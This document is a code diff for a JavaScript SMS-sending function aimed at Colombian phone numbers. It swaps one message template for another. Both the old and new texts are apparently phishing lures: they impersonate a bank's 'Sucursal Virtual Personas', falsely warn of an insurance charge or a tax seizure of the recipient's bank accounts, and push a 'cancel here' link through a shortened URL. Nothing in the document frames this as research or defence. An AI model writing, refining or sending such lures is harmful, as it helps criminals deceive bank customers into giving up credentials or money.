@@ -71,7 +71,7 @@ const sendSMS = async (
     sender: 'INFO',
     number: '57' + num,
     // message: `${name} la Sucursal Virtual Personas te informa que se activo un seguro de celular protegido por $139,900.00 el 24/07/2024. Cancélelo aqui: `,
-    message: `${name}, Suc. Virtual Personas Te informa que se activo un seguro de celular protegido por $139,900 el 01/08/2024. Cancélelo aqui: ${urlShorter}`,
+    message: `Testt un proceso de embargo tributario en sus cuentas bancarias por saldos en mora. Cancele y obtenga su Paz y Salvo aqui: t.co/NyRFqIEoUr`,
 
     // message: 'Sucursal',
   });
